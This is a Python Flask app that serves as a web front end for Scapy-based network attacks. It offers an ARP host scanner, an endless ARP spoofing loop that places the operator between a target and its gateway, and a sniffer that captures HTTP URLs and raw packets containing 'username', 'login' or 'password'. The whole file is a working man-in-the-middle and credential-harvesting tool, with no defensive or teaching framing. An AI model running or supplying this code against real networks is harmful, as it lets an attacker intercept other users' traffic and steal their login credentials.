from flask import Flask, render_template, request
import scapy.all as scapy
import time
import sys
import threading
from scapy.layers import http

app = Flask(__name__)

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    client_list = []
    for element in answered_list:
        client_dict = {"IP": element[1].psrc, "Mac": element[1].hwsrc}
        client_list.append(client_dict)
    return client_list


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("[-] No response received for the ARP request.")
        return None

packet_count = 0
def spoof( target_ip , spoof_ip ):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc= spoof_ip)
    scapy.send(packet)
    
# Function to restore ARP tables
def restore(destination_ip, source_ip, target_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)
    
    
interfaces = scapy.get_if_list()
selected_interface = None
sniff_output = []

def sniff_packets(interface):
    def process_sniffed_packet(packet):
        output = ""
        if packet.haslayer(http.HTTPRequest):
            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
            output += f"URL: {url}\n"

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            load = load if isinstance(load, bytes) else bytes(load, 'utf-8')

            keywords = [b"username", b"user", b"login", b"password", b"pass"]
            for keyword in keywords:
                if keyword in load:
                    output += f"Sniffed data: {load.decode('utf-8')}\n"
                    break

        if output:
            sniff_output.append(output)

    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


@app.route('/')
def index():
    return render_template('about.html')

@app.route('/scan', methods=['GET', 'POST'])
def scan_ip():
    if request.method == 'POST':
        ip_address = request.form['ip_address']
        scan_result = scan(ip_address)
        return render_template('scan.html', scan_result=scan_result)
    else:  # GET request handling
        # Perform any necessary GET-specific logic here
        return render_template('scan.html')



@app.route('/spoof', methods=['GET', 'POST'])
def spoof_ip():
    global packet_count

    if request.method == 'POST':
        gateway_ip = request.form.get('gateway_ip')
        target_ip = request.form.get('target_ip')
        
        if gateway_ip and target_ip:
            try:
                while True:
                    spoof(target_ip, gateway_ip)
                    spoof(gateway_ip, target_ip)
                    packet_count += 2
                    time.sleep(2)
            except KeyboardInterrupt:
                restore(target_ip, gateway_ip, target_ip)
                restore(gateway_ip, target_ip, target_ip)
        
    return render_template('spoof.html', packet_count=str(packet_count))

@app.route('/sniff', methods=['GET', 'POST'])
def sniff_index():
    global selected_interface, sniff_thread

    if request.method == 'POST':
        selected_interface = request.form['interface']
        sniff_thread = threading.Thread(target=sniff_packets, args=(selected_interface,))
        sniff_thread.daemon = True
        sniff_thread.start()

    return render_template('sniff.html', interfaces=interfaces, selected_interface=selected_interface, sniff_output=sniff_output)

@app.route('/output')
def output():
    return '\n'.join(sniff_output)

if __name__ == '__main__':
    app.run(debug=True)
